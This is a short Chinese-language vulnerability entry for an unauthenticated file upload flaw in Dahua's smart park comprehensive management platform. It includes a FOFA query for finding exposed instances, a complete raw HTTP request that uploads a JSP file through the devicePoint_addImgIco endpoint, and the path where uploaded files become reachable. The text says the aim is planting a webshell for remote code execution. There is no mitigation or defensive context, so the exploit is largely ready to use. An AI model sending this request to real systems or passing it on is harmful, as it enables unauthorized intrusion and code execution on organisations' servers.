# 大华智慧园区综合管理平台hasSubsystem存在文件上传漏洞

大华智慧园区综合管理平台hasSubsystem存在文件上传漏洞，未经授权的攻击者可以上传恶意Webshell的JSP文件，可以进行RCE利用。

## fofa

```javascript
app="dahua-智慧园区综合管理平台"
```

## poc

```javascript
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
User-Agent: Java/1.8.0_345
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 229
Connection: close

--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

123456
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
```

![image-20241008142600054](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410081426265.png)

文件路径 `http://ip:port/upload/emap/society_new/`+文件名